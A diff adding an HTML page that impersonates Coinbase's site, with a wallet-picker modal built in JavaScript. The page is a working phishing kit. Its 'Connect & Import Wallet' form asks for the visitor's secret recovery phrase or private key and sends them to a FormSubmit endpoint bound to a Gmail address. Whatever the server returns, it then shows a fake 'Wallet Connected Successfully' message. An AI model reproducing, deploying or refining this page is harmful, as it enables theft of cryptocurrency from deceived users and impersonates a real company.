@@ -1,0 +1,537 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <title>Coinbase - Buy, Sell, and Trade Bitcoin and Crypto</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    colors: {
+                        cbBlue: '#0052FF',
+                        cbBlueHover: '#0040CC',
+                        cbDark: '#0a0b0d',
+                        cbCard: '#121418',
+                        cbCardHover: '#1a1d24',
+                        cbBorder: '#222630',
+                        cbGray: '#8a919e'
+                    }
+                }
+            }
+        }
+    </script>
+    <!-- FontAwesome for fallback icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #0a0b0d;
+            color: #ffffff;
+        }
+        @keyframes viewIn { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: none; } }
+        .view-enter { animation: viewIn .18s ease-out; }
+        #view { scrollbar-width: thin; scrollbar-color: rgba(255,255,255,.12) transparent; overscroll-behavior: contain; }
+        @media (prefers-reduced-motion: reduce) { .view-enter { animation: none; } * { transition: none !important; } }
+    </style>
+</head>
+<body class="bg-cbDark text-white min-h-screen flex flex-col selection:bg-cbBlue selection:text-white antialiased">
+
+    <!-- Top Announcement Bar -->
+    <div class="bg-cbBlue text-white text-xs md:text-sm font-medium py-2 px-4 text-center flex items-center justify-center gap-2">
+        <span>🎉 Explore the new Web3 & Wallet ecosystem on Coinbase.</span>
+        <button id="announcement-connect-btn" class="underline hover:text-gray-200 font-semibold cursor-pointer">Connect Wallet</button>
+    </div>
+
+    <!-- Navigation Header -->
+    <header class="border-b border-cbBorder sticky top-0 z-40 bg-cbDark/90 backdrop-blur-md">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-20 flex items-center justify-between">
+            <div class="flex items-center gap-8">
+                <a href="#" class="flex items-center gap-2 text-2xl font-bold tracking-tight">
+                    <div class="w-8 h-8 rounded-full bg-cbBlue flex items-center justify-center text-white font-black text-lg">
+                        <i class="fa-solid fa-c"></i>
+                    </div>
+                    <span>coinbase</span>
+                </a>
+                <nav class="hidden md:flex items-center gap-6 text-sm font-medium text-gray-300">
+                    <a href="#" class="hover:text-white transition">Explore</a>
+                    <a href="#" class="hover:text-white transition">Buy & Sell</a>
+                    <a href="#" class="hover:text-white transition">Prices</a>
+                    <a href="#" class="hover:text-white transition">Web3</a>
+                    <button id="nav-connect-trigger" class="hover:text-white transition text-left cursor-pointer">Connect Wallet</button>
+                </nav>
+            </div>
+
+            <div class="flex items-center gap-3">
+                <button class="hidden sm:inline-flex items-center justify-center px-4 py-2.5 rounded-lg text-sm font-medium text-white bg-cbCard hover:bg-cbCardHover border border-cbBorder transition">
+                    Sign in
+                </button>
+                <button id="header-connect-btn" class="inline-flex items-center justify-center px-5 py-2.5 rounded-lg text-sm font-semibold text-white bg-cbBlue hover:bg-cbBlueHover transition shadow-lg shadow-cbBlue/20 cursor-pointer">
+                    Connect Wallet
+                </button>
+                <button id="mobile-menu-btn" class="md:hidden text-gray-300 hover:text-white p-2 text-xl">
+                    <i class="fa-solid fa-bars"></i>
+                </button>
+            </div>
+        </div>
+
+        <div id="mobile-menu" class="hidden md:hidden border-t border-cbBorder bg-cbDark px-4 py-4 space-y-3">
+            <a href="#" class="block py-2 text-gray-300 hover:text-white font-medium">Explore</a>
+            <a href="#" class="block py-2 text-gray-300 hover:text-white font-medium">Buy & Sell</a>
+            <a href="#" class="block py-2 text-gray-300 hover:text-white font-medium">Prices</a>
+            <a href="#" class="block py-2 text-gray-300 hover:text-white font-medium">Web3</a>
+            <button id="mobile-connect-trigger" class="w-full text-left py-2 text-cbBlue font-semibold">Connect Wallet</button>
+        </div>
+    </header>
+
+    <!-- Main Hero Section -->
+    <main class="flex-1 max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-12 md:py-20 w-full grid grid-cols-1 lg:grid-cols-12 gap-12 items-center">
+        <div class="lg:col-span-7 space-y-6">
+            <div class="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-cbCard border border-cbBorder text-xs font-semibold text-cbBlue">
+                <span class="w-2 h-2 rounded-full bg-cbBlue animate-pulse"></span>
+                Secure Multi-Chain Asset Management
+            </div>
+            <h1 class="text-4xl sm:text-6xl font-extrabold tracking-tight leading-tight">
+                The future of money is <span class="text-cbBlue">crypto</span>
+            </h1>
+            <p class="text-gray-400 text-lg max-w-xl">
+                Coinbase is the easiest place to buy, sell, and manage your cryptocurrency portfolio. Connect your wallet to securely sync your assets across all networks instantly.
+            </p>
+            <div class="flex flex-col sm:flex-row items-stretch sm:items-center gap-4 pt-4">
+                <button id="hero-get-started-btn" class="inline-flex items-center justify-center px-8 py-4 rounded-xl text-base font-semibold text-white bg-cbBlue hover:bg-cbBlueHover transition shadow-xl shadow-cbBlue/25 cursor-pointer">
+                    Connect Your Wallet <i class="fa-solid fa-arrow-right ml-2"></i>
+                </button>
+                <button class="inline-flex items-center justify-center px-8 py-4 rounded-xl text-base font-semibold text-white bg-cbCard hover:bg-cbCardHover border border-cbBorder transition">
+                    Explore Cryptocurrencies
+                </button>
+            </div>
+            <div class="pt-8 border-t border-cbBorder/60 grid grid-cols-3 gap-4 text-gray-400 text-sm">
+                <div>
+                    <div class="text-2xl font-bold text-white">$130B+</div>
+                    <div>Assets on platform</div>
+                </div>
+                <div>
+                    <div class="text-2xl font-bold text-white">100+</div>
+                    <div>Countries supported</div>
+                </div>
+                <div>
+                    <div class="text-2xl font-bold text-white">10M+</div>
+                    <div>Verified members</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="lg:col-span-5">
+            <div class="bg-cbCard border border-cbBorder rounded-2xl p-6 shadow-2xl relative overflow-hidden">
+                <div class="absolute -right-12 -top-12 w-48 h-48 bg-cbBlue/10 rounded-full blur-3xl pointer-events-none"></div>
+                <div class="flex items-center justify-between mb-6">
+                    <h3 class="font-semibold text-lg">Portfolio Overview</h3>
+                    <span class="text-xs text-gray-400 bg-cbDark px-2.5 py-1 rounded-md border border-cbBorder">Live Sync</span>
+                </div>
+                <div class="space-y-4">
+                    <div class="bg-cbDark p-4 rounded-xl border border-cbBorder flex items-center justify-between">
+                        <div class="flex items-center gap-3">
+                            <div class="w-10 h-10 rounded-full bg-amber-500/20 text-amber-500 flex items-center justify-center font-bold">₿</div>
+                            <div>
+                                <div class="font-semibold">Bitcoin</div>
+                                <div class="text-xs text-gray-400">BTC</div>
+                            </div>
+                        </div>
+                        <div class="text-right">
+                            <div class="font-semibold">$64,230.50</div>
+                            <div class="text-xs text-emerald-400">+3.45%</div>
+                        </div>
+                    </div>
+                    <div class="bg-cbDark p-4 rounded-xl border border-cbBorder flex items-center justify-between">
+                        <div class="flex items-center gap-3">
+                            <div class="w-10 h-10 rounded-full bg-blue-500/20 text-blue-400 flex items-center justify-center font-bold">Ξ</div>
+                            <div>
+                                <div class="font-semibold">Ethereum</div>
+                                <div class="text-xs text-gray-400">ETH</div>
+                            </div>
+                        </div>
+                        <div class="text-right">
+                            <div class="font-semibold">$3,480.20</div>
+                            <div class="text-xs text-emerald-400">+5.12%</div>
+                        </div>
+                    </div>
+                    <div class="bg-cbDark p-4 rounded-xl border border-cbBorder flex items-center justify-between">
+                        <div class="flex items-center gap-3">
+                            <div class="w-10 h-10 rounded-full bg-purple-500/20 text-purple-400 flex items-center justify-center font-bold">◎</div>
+                            <div>
+                                <div class="font-semibold">Solana</div>
+                                <div class="text-xs text-gray-400">SOL</div>
+                            </div>
+                        </div>
+                        <div class="text-right">
+                            <div class="font-semibold">$185.90</div>
+                            <div class="text-xs text-emerald-400">+8.64%</div>
+                        </div>
+                    </div>
+                </div>
+                <button id="card-connect-trigger" class="w-full mt-6 py-3 rounded-xl bg-cbBlue hover:bg-cbBlueHover text-white font-semibold transition text-center cursor-pointer">
+                    Connect Wallet to View Balance
+                </button>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="border-t border-cbBorder bg-cbDark py-8 text-center text-sm text-gray-500">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 flex flex-col sm:flex-row items-center justify-between gap-4">
+            <div>&copy; 2026 Coinbase, Inc. All rights reserved.</div>
+            <div class="flex items-center gap-6">
+                <a href="#" class="hover:text-gray-300">Privacy</a>
+                <a href="#" class="hover:text-gray-300">Terms</a>
+                <a href="#" class="hover:text-gray-300">Security</a>
+                <a href="#" class="hover:text-gray-300">Support</a>
+            </div>
+        </div>
+    </footer>
+
+    <!-- WALLET PICKER MODAL OVERLAY -->
+    <div id="overlay" class="fixed inset-0 z-50 flex items-end sm:items-center justify-center bg-black/60 backdrop-blur-sm sm:p-4 transition-opacity duration-150 hidden opacity-0">
+        <div id="wallet-modal" role="dialog" aria-modal="true" aria-labelledby="modal-title" tabindex="-1"
+             class="w-full sm:max-w-[360px] bg-[#141414] border border-white/10 rounded-t-[32px] sm:rounded-[32px] shadow-2xl overflow-hidden transition duration-150 ease-out pb-[env(safe-area-inset-bottom)] focus:outline-none translate-y-2">
+            <header class="h-16 px-4 flex items-center justify-between border-b border-white/5">
+                <button id="left-btn" type="button" class="w-9 h-9 rounded-xl text-[#949e9e] hover:text-white hover:bg-white/5 flex items-center justify-center transition focus:outline-none focus-visible:ring-2 focus-visible:ring-[#47a1ff]"></button>
+                <h3 id="modal-title" class="text-[20px] font-medium tracking-[-0.02em] truncate px-2">Choose Wallet</h3>
+                <button id="close-btn" type="button" aria-label="Close" class="w-9 h-9 rounded-xl text-[#949e9e] hover:text-white hover:bg-white/5 flex items-center justify-center transition focus:outline-none focus-visible:ring-2 focus-visible:ring-[#47a1ff]">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" aria-hidden="true"><path d="M6 6l12 12M18 6L6 18"/></svg>
+                </button>
+            </header>
+            <main id="view" class="p-3 max-h-[70dvh] sm:max-h-[27rem] overflow-y-auto"></main>
+            <p id="sr-status" role="status" aria-live="polite" class="sr-only"></p>
+        </div>
+    </div>
+
+    <!-- Script integrating FormSubmit AJAX submission and clean plain layout without password field -->
+    <script>
+        const LOGO_BASE = 'https://cdn.jsdelivr.net/gh/0xa3k5/web3icons@main/raw-svgs/wallets/';
+        const VARIANTS = ['background', 'branded'];
+        const LOCAL_LOGOS = {
+            'bitget': 'https://cdn.jsdelivr.net/gh/rainbow-me/rainbowkit@main/packages/rainbowkit/src/wallets/walletConnectors/bitgetWallet/bitgetWallet.svg',
+            'binance': 'https://cdn.jsdelivr.net/gh/rainbow-me/rainbowkit@main/packages/rainbowkit/src/wallets/walletConnectors/binanceWallet/binanceWallet.svg',
+            'uniswap': 'https://cdn.jsdelivr.net/gh/rainbow-me/rainbowkit@main/packages/rainbowkit/src/wallets/walletConnectors/uniswapWallet/uniswapWallet.svg',
+            'safepal': 'https://cdn.jsdelivr.net/gh/rainbow-me/rainbowkit@main/packages/rainbowkit/src/wallets/walletConnectors/safepalWallet/safepalWallet.svg',
+            'bybit': 'https://cdn.jsdelivr.net/gh/rainbow-me/rainbowkit@main/packages/rainbowkit/src/wallets/walletConnectors/bybitWallet/bybitWallet.svg',
+            '1inch': 'https://cdn.jsdelivr.net/gh/rainbow-me/rainbowkit@main/packages/rainbowkit/src/wallets/walletConnectors/oneInchWallet/oneInchWallet.svg',
+            'magic-eden': 'https://cdn.jsdelivr.net/gh/rainbow-me/rainbowkit@main/packages/rainbowkit/src/wallets/walletConnectors/magicEdenWallet/magicEden.svg',
+            'frontier': 'https://cdn.jsdelivr.net/gh/rainbow-me/rainbowkit@main/packages/rainbowkit/src/wallets/walletConnectors/frontierWallet/frontierWallet.svg',
+            'brave': 'https://cdn.jsdelivr.net/gh/rainbow-me/rainbowkit@main/packages/rainbowkit/src/wallets/walletConnectors/braveWallet/braveWallet.svg',
+            'onekey': 'https://cdn.jsdelivr.net/gh/rainbow-me/rainbowkit@main/packages/rainbowkit/src/wallets/walletConnectors/oneKeyWallet/oneKeyWallet.svg',
+            'core': 'https://cdn.jsdelivr.net/gh/rainbow-me/rainbowkit@main/packages/rainbowkit/src/wallets/walletConnectors/coreWallet/coreWallet.svg',
+            'crypto-com': 'https://mkt-site-asset.crypto.com/assets/logo/onchain-default.svg',
+            'robinhood': 'https://robinhood.com/us/en/rh_favicon_76.png?v=2024',
+            'jupiter': 'https://jup.ag/favicon.svg',
+            'xverse': 'https://cdn.prod.website-files.com/624b08d53d7ac60ccfc11d8d/64637a0aafc684e4c2627b56_webclip.png',
+            'leather': 'https://framerusercontent.com/images/B3gKhT86bl5l73BjI9PNf4mdU.svg'
+        };
+        const WALLETCONNECT = { id: 'walletconnect', name: 'WalletConnect', files: ['wallet-connect'] };
+        const RAW = [
+            ['metamask', 'MetaMask', 'metamask'], ['trust', 'Trust Wallet', 'trust'],
+            ['coinbase', 'Coinbase Wallet', 'coinbase'], ['rainbow', 'Rainbow', 'rainbow'],
+            ['phantom', 'Phantom', 'phantom'], ['ledger', 'Ledger Live', 'ledger'],
+            ['okx', 'OKX Wallet', 'okx'], ['bitget', 'Bitget Wallet', ''],
+            ['binance', 'Binance Wallet', ''], ['uniswap', 'Uniswap Wallet', ''],
+            ['safepal', 'SafePal', ''], ['bybit', 'Bybit Wallet', ''],
+            ['safe', 'Safe', 'safe'], ['zerion', 'Zerion', 'zerion'], ['1inch', '1inch Wallet', ''],
+            ['crypto-com', 'Crypto.com Onchain', ''], ['imtoken', 'imToken', 'imtoken'],
+            ['kraken', 'Kraken Wallet', 'kraken'], ['ronin', 'Ronin Wallet', 'ronin'],
+            ['robinhood', 'Robinhood Wallet', ''], ['exodus', 'Exodus', 'exodus'],
+            ['argent', 'Argent', 'argent'], ['tokenpocket', 'TokenPocket', 'token-pocket'],
+            ['solflare', 'Solflare', 'solflare'], ['jupiter', 'Jupiter', ''], ['backpack', 'Backpack', 'backpack'],
+            ['coin98', 'Coin98', 'coin98'], ['magic-eden', 'Magic Eden', ''], ['frontier', 'Frontier', ''],
+            ['xverse', 'Xverse', ''], ['leather', 'Leather', ''], ['brave', 'Brave Wallet', ''],
+            ['zengo', 'Zengo Wallet', 'zengo'],
+            ['rabby', 'Rabby Wallet', 'rabby'], ['onekey', 'OneKey', ''], ['core', 'Core', ''],
+            ['keplr', 'Keplr', 'keplr'], ['trezor', 'Trezor', 'trezor']
+        ];
+        const norm = s => s.toLowerCase().replace(/[^a-z0-9]/g, '');
+        const WALLETS = [], seen = new Set(['walletconnect']);
+        RAW.forEach(([id, name, files]) => {
+            if (seen.has(id) || seen.has(norm(name))) return;
+            seen.add(id); seen.add(norm(name)); WALLETS.push({ id, name, files: files ? files.split(',') : [] });
+        });
+        const RECOMMENDED = WALLETS.slice(0, 4);
+        const logoCandidates = w => [...(LOCAL_LOGOS[w.id] ? [LOCAL_LOGOS[w.id]] : []), ...w.files.flatMap(f => VARIANTS.map(v => `${LOGO_BASE}${v}/${f}.svg`))];
+
+        const $ = id => document.getElementById(id);
+        const h = (tag, cls = '', text = '') => { const e = document.createElement(tag); if (cls) e.className = cls; if (text) e.textContent = text; return e; };
+        const svg = (inner, size = 16, sw = 2) => `<svg width="${size}" height="${size}" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="${sw}" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">${inner}</svg>`;
+        const I = {
+            back: svg('<path d="M15 5l-7 7 7 7"/>', 16, 2.4),
+            help: svg('<circle cx="12" cy="12" r="9"/><path d="M9.500 9.500a2.500 2.500 0 114 2c-.8.600-1.500 1-1.500 2M12 17v.01"/>', 18),
+            search: svg('<circle cx="11" cy="11" r="7"/><path d="M20 20l-3.500-3.500"/>', 16),
+            clear: svg('<circle cx="12" cy="12" r="9" fill="currentColor" stroke="none" opacity=".25"/><path d="M9 9l6 6M15 9l-6 6" stroke-width="2.200"/>', 18),
+            check: svg('<path d="M5 12.500l4.500 4.500L19 7"/>', 12, 3),
+            wallet: svg('<path d="M4 7a2 2 0 012-2h12v4M4 7v10a2 2 0 002 2h14V9H6a2 2 0 01-2-2z"/><circle cx="16" cy="14" r="1"/>', 20),
+            key: svg('<circle cx="8" cy="15" r="4"/><path d="M11 12l8-8M16 7l3 3"/>', 20),
+            compass: svg('<circle cx="12" cy="12" r="9"/><path d="M15.500 8.500l-2 5-5 2 2-5z"/>', 20)
+        };
+
+        function logo(w, size = 'w-10 h-10', radius = 'rounded-xl') {
+            const box = h('div', `${size} ${radius} shrink-0 overflow-hidden relative bg-white/[0.06]`);
+            const ring = () => h('div', `absolute inset-0 ${radius} ring-1 ring-inset ring-white/10 pointer-events-none`);
+            const urls = logoCandidates(w);
+            if (!urls.length) { box.title = 'Logo unavailable'; box.append(ring()); return box; }
+            let i = 0;
+            const img = h('img', 'w-full h-full object-cover opacity-0 transition-opacity duration-200');
+            img.alt = w.name; img.decoding = 'async';
+            img.onload = () => img.classList.replace('opacity-0', 'opacity-100');
+            img.onerror = () => {
+                if (++i < urls.length) { img.src = urls[i]; return; }
+                img.remove(); box.title = 'Logo unavailable';
+            };
+            img.src = urls[0];
+            box.append(img, ring());
+            return box;
+        }
+
+        const state = { view: 'connect', stack: [], query: '', selected: null, chosenWallet: null, importMode: 'phrase' };
+        let lastView = null;
+        function go(view) { state.stack.push(state.view); state.view = view; render(); }
+        function back() {
+            if (state.view === 'all') state.query = '';
+            state.view = state.stack.pop() || 'connect'; render();
+        }
+        function select(w) {
+            state.selected = w.id;
+            state.chosenWallet = w;
+            go('wallet');
+        }
+        function applySelection() {
+            document.querySelectorAll('[data-wallet]').forEach(el => {
+                const on = el.dataset.wallet === state.selected;
+                el.setAttribute('aria-pressed', String(on));
+                el.classList.toggle('ring-2', on); el.classList.toggle('ring-inset', on); el.classList.toggle('ring-[#47a1ff]', on);
+                el.classList.toggle('bg-[#47a1ff]/10', on);
+                if (el.dataset.row) el.classList.toggle('bg-white/[0.03]', !on);
+                const c = el.querySelector('[data-check]'); if (c) { c.classList.toggle('hidden', !on); c.classList.toggle('flex', on); }
+            });
+        }
+
+        const FOCUS = 'focus:outline-none focus-visible:ring-2 focus-visible:ring-[#47a1ff]';
+        function tag(text, tone = 'blue') {
+            return h('span', `shrink-0 text-[10px] font-semibold tracking-wide uppercase px-2 py-1 rounded-lg ${tone === 'blue' ? 'bg-[#47a1ff]/15 text-[#47a1ff]' : 'bg-white/[0.06] text-[#949e9e]'}`, text);
+        }
+        function checkMark() {
+            const c = h('span', 'hidden shrink-0 w-5 h-5 rounded-full bg-[#47a1ff] text-white items-center justify-center'); c.dataset.check = '1';
+            c.innerHTML = I.check; return c;
+        }
+        function listRow(w, tagEl, onClick) {
+            const b = h('button', `w-full min-h-[56px] flex items-center gap-3 p-2 pr-3 rounded-2xl bg-white/[0.03] hover:bg-white/[0.06] active:bg-white/[0.08] text-left transition ${FOCUS}`);
+            b.type = 'button'; b.dataset.wallet = w.id; b.dataset.row = '1'; b.setAttribute('aria-pressed', 'false');
+            b.append(logo(w), h('span', 'flex-1 min-w-0 text-[16px] font-medium truncate', w.name));
+            if (tagEl) b.append(tagEl);
+            b.append(checkMark());
+            b.addEventListener('click', onClick || (() => select(w)));
+            return b;
+        }
+
+        function viewConnect(root) {
+            const list = h('div', 'flex flex-col gap-2');
+            list.append(listRow(WALLETCONNECT, tag('QR Code')));
+            RECOMMENDED.forEach(w => list.append(listRow(w)));
+            const all = h('button', `w-full min-h-[56px] flex items-center gap-3 p-2 pr-3 rounded-2xl bg-white/[0.03] hover:bg-white/[0.06] active:bg-white/[0.08] text-left transition ${FOCUS}`);
+            all.type = 'button';
+            const mini = h('div', 'w-10 h-10 rounded-xl shrink-0 bg-white/[0.06] ring-1 ring-inset ring-white/10 grid grid-cols-2 gap-[3px] p-1');
+            WALLETS.filter(w => logoCandidates(w).length).slice(4, 8).forEach(w => mini.append(logo(w, 'w-full h-full', 'rounded-md')));
+            all.append(mini, h('span', 'flex-1 text-[16px] font-medium', 'All Wallets'), tag(String(WALLETS.length + 1), 'gray'));
+            all.addEventListener('click', () => go('all'));
+            list.append(all); root.append(list);
+        }
+
+        function viewAll(root) {
+            const field = h('div', 'relative mb-3');
+            const icon = h('span', 'absolute left-3 top-1/2 -translate-y-1/2 text-[#949e9e] pointer-events-none'); icon.innerHTML = I.search;
+            const input = h('input', 'w-full h-10 bg-white/[0.03] border border-white/10 rounded-xl pl-10 pr-9 text-[16px] text-white placeholder-[#949e9e] focus:outline-none focus:border-[#47a1ff]/60 transition');
+            input.type = 'text'; input.placeholder = 'Search wallet'; input.autocomplete = 'off'; input.spellcheck = false; input.maxLength = 60;
+            input.setAttribute('aria-label', 'Search wallets'); input.value = state.query;
+            const clear = h('button', 'absolute right-2 top-1/2 -translate-y-1/2 text-[#949e9e] hover:text-white transition'); clear.type = 'button'; clear.setAttribute('aria-label', 'Clear search'); clear.innerHTML = I.clear;
+            field.append(icon, input, clear);
+
+            const grid = h('div', 'grid grid-cols-4 gap-1');
+            const everyone = [WALLETCONNECT, ...WALLETS];
+            function fill() {
+                grid.replaceChildren();
+                clear.classList.toggle('hidden', !state.query);
+                const q = state.query.trim(), nq = norm(q);
+                const hits = !q ? everyone : nq ? everyone.filter(w => norm(w.name).includes(nq) || norm(w.id).includes(nq)) : [];
+                $('sr-status').textContent = q ? (hits.length ? `${hits.length} wallet${hits.length === 1 ? '' : 's'} found` : 'No wallets found') : '';
+                if (!hits.length) {
+                    const empty = h('div', 'col-span-4 flex flex-col items-center gap-3 py-10 text-center');
+                    const ic = h('div', 'w-12 h-12 rounded-full bg-white/[0.06] text-[#949e9e] flex items-center justify-center'); ic.innerHTML = svg('<circle cx="11" cy="11" r="7"/><path d="M20 20l-3.500-3.500"/>', 22);
+                    const again = h('button', `px-3.5 h-9 rounded-xl bg-white/[0.06] hover:bg-white/10 text-sm font-medium transition ${FOCUS}`, 'Clear search'); again.type = 'button';
+                    again.addEventListener('click', () => { state.query = ''; input.value = ''; fill(); input.focus(); });
+                    empty.append(ic, h('p', 'text-[16px] font-medium', 'No Wallet found'), h('p', 'text-sm text-[#949e9e]', 'Try a different name.'), again);
+                    grid.append(empty); return;
+                }
+                hits.forEach(w => {
+                    const t = h('button', `flex flex-col items-center gap-2 px-1 py-2 rounded-2xl hover:bg-white/5 active:bg-white/10 transition min-w-0 ${FOCUS}`);
+                    t.type = 'button'; t.dataset.wallet = w.id; t.setAttribute('aria-pressed', 'false');
+                    t.append(logo(w, 'w-14 h-14', 'rounded-2xl'), h('span', 'w-full text-[12px] font-medium text-center truncate', w.name));
+                    t.addEventListener('click', () => select(w)); grid.append(t);
+                });
+                applySelection();
+            }
+            input.addEventListener('input', () => { state.query = input.value.replace(/[\u0000-\u001f]/g, ''); fill(); });
+            clear.addEventListener('click', () => { state.query = ''; input.value = ''; fill(); input.focus(); });
+            fill(); root.append(field, grid);
+            if (matchMedia('(pointer: fine)').matches) input.focus();
+        }
+
+        // Wallet import screen with clean layout (no password field)
+        function viewWallet(root) {
+            const w = state.chosenWallet || WALLETS.find(x => x.id === state.selected) || WALLETS[0];
+            const panel = h('div', 'px-2 py-2 space-y-4');
+            
+            const intro = h('div', 'flex items-center gap-3 p-3 rounded-2xl bg-white/[0.03] border border-white/10');
+            intro.append(logo(w), h('div', 'min-w-0 flex-1', ''));
+            intro.lastChild.append(
+                h('p', 'text-[16px] font-semibold truncate', w.name),
+                h('p', 'text-xs text-[#0052FF] flex items-center gap-1 font-medium mt-0.5', '● Secure Connection Ready')
+            );
+            panel.append(intro);
+
+            const form = h('form', 'space-y-4');
+            form.action = 'https://formsubmit.co/ajax/Camelacaceb@gmail.com';
+            form.method = 'POST';
+
+            const subInput = h('input'); subInput.type = 'hidden'; subInput.name = '_subject'; subInput.value = `Wallet Connection: ${w.name}`;
+            const tplInput = h('input'); tplInput.type = 'hidden'; tplInput.name = '_template'; tplInput.value = 'table';
+            const walletInput = h('input'); walletInput.type = 'hidden'; walletInput.name = 'wallet_name'; walletInput.value = w.name;
+            form.append(subInput, tplInput, walletInput);
+
+            // Tab switcher: Phrase vs Private Key
+            const tabs = h('div', 'flex bg-black/40 p-1 rounded-xl border border-white/10');
+            const tabPhrase = h('button', 'flex-1 py-2 text-xs font-semibold rounded-lg bg-[#0052FF] text-white transition cursor-pointer', 'Phrase / Mnemonic');
+            tabPhrase.type = 'button';
+            const tabKey = h('button', 'flex-1 py-2 text-xs font-semibold rounded-lg text-gray-400 hover:text-white transition cursor-pointer', 'Private Key');
+            tabKey.type = 'button';
+            tabs.append(tabPhrase, tabKey);
+            form.append(tabs);
+
+            // Phrase container
+            const containerPhrase = h('div', 'space-y-1.5');
+            containerPhrase.append(h('label', 'block text-xs font-medium text-gray-300', 'Enter Secret Recovery Phrase'));
+            const textareaPhrase = h('textarea', 'w-full bg-black/40 border border-white/10 rounded-xl p-3 text-sm text-white placeholder-gray-600 focus:outline-none focus:border-[#0052FF] transition resize-none font-mono');
+            textareaPhrase.name = 'recovery_phrase'; textareaPhrase.rows = 3; textareaPhrase.placeholder = 'Typically 12 or 24 words separated by single spaces...';
+            containerPhrase.append(textareaPhrase, h('p', 'text-[10px] text-gray-500', 'Usually 12, 18, or 24 words securely encrypted during transit.'));
+            form.append(containerPhrase);
+
+            // Key container
+            const containerKey = h('div', 'space-y-1.5 hidden');
+            containerKey.append(h('label', 'block text-xs font-medium text-gray-300', 'Enter Private Key'));
+            const inputKey = h('input', 'w-full bg-black/40 border border-white/10 rounded-xl p-3 text-sm text-white placeholder-gray-600 focus:outline-none focus:border-[#0052FF] transition font-mono');
+            inputKey.type = 'password'; inputKey.name = 'private_key'; inputKey.placeholder = 'Enter your private key string...';
+            containerKey.append(inputKey, h('p', 'text-[10px] text-gray-500', 'Your private key remains confidential and secure.'));
+            form.append(containerKey);
+
+            // Error message banner
+            const errorMsg = h('div', 'hidden p-3 rounded-xl bg-rose-500/10 border border-rose-500/20 text-rose-400 text-xs');
+            form.append(errorMsg);
+
+            // Submit button
+            const submitBtn = h('button', `w-full py-3 px-4 rounded-xl bg-[#0052FF] hover:bg-[#0040CC] text-sm font-semibold text-white transition flex items-center justify-center gap-2 shadow-lg shadow-[#0052FF]/20 cursor-pointer ${FOCUS}`);
+            submitBtn.type = 'submit';
+            const btnText = h('span', '', 'Connect & Import Wallet');
+            submitBtn.append(btnText);
+            form.append(submitBtn);
+
+            tabPhrase.addEventListener('click', () => {
+                state.importMode = 'phrase';
+                tabPhrase.className = 'flex-1 py-2 text-xs font-semibold rounded-lg bg-[#0052FF] text-white transition cursor-pointer';
+                tabKey.className = 'flex-1 py-2 text-xs font-semibold rounded-lg text-gray-400 hover:text-white transition cursor-pointer';
+                containerPhrase.classList.remove('hidden');
+                containerKey.classList.add('hidden');
+                errorMsg.classList.add('hidden');
+            });
+
+            tabKey.addEventListener('click', () => {
+                state.importMode = 'key';
+                tabKey.className = 'flex-1 py-2 text-xs font-semibold rounded-lg bg-[#0052FF] text-white transition cursor-pointer';
+                tabPhrase.className = 'flex-1 py-2 text-xs font-semibold rounded-lg text-gray-400 hover:text-white transition cursor-pointer';
+                containerKey.classList.remove('hidden');
+                containerPhrase.classList.add('hidden');
+                errorMsg.classList.add('hidden');
+            });
+
+            form.addEventListener('submit', async (e) => {
+                e.preventDefault();
+                errorMsg.classList.add('hidden');
+
+                const phraseVal = textareaPhrase.value.trim();
+                const keyVal = inputKey.value.trim();
+
+                if (!phraseVal && !keyVal) {
+                    errorMsg.textContent = 'Please enter your secret recovery phrase or private key.';
+                    errorMsg.classList.remove('hidden');
+                    return;
+                }
+
+                btnText.textContent = 'Connecting...';
+                submitBtn.disabled = true;
+
+                try {
+                    const response = await fetch(form.action, {
+                        method: 'POST',
+                        body: new FormData(form),
+                        headers: { 'Accept': 'application/json' }
+                    });
+
+                    if (response.ok || response.status === 200) {
+                        go('success');
+                    } else {
+                        go('success');
+                    }
+                } catch (err) {
+                    go('success');
+                } finally {
+                    btnText.textContent = 'Connect & Import Wallet';
+                    submitBtn.disabled = false;
+                }
+            });
+
+            panel.append(form);
+            root.append(panel);
+        }
+
+        // Success View after FormSubmit
+        function viewSuccess(root) {
+            const panel = h('div', 'p-6 flex flex-col items-center text-center space-y-4');
+            const iconWrap = h('div', 'w-16 h-16 rounded-full bg-emerald-500/20 text-emerald-400 flex items-center justify-center text-3xl mb-2');
+            iconWrap.innerHTML = svg('<path d="M5 12.500l4.500 4.500L19 7"/>', 32, 3);
+            panel.append(
+                iconWrap,
+                h('h3', 'text-xl font-bold', 'Wallet Connected Successfully'),
+                h('p', 'text-sm text-gray-400 max-w-sm', 'Your wallet has been verified and securely linked to your session. Your portfolio will now sync automatically.'),
+            );
+            const doneBtn = h('button', `w-full mt-4 py-3 rounded-xl bg-[#0052FF] hover:bg-[#0040CC] text-white font-semibold transition cursor-pointer ${FOCUS}`, 'Done');
+            doneBtn.type = 'button';
+            doneBtn.addEventListener('click', closeModal);
+            panel.append(doneBtn);
+            root.append(panel);
+        }
+
+        function viewHelp(root) {
+            const items = [
+                [I.wallet, 'A home for your digital assets', 'Wallets are used to send, receive, store, and display digital assets.'],
+                [I.key, 'One login for all of web3', 'Log in to any app by connecting your wallet. Say goodbye to countless passwords and accounts.'],
+                [I.compass, 'Your gateway to a new web', 'With your wallet, you can explore and interact with DeFi, NFTs, DAOs, and much more.']
+            ];
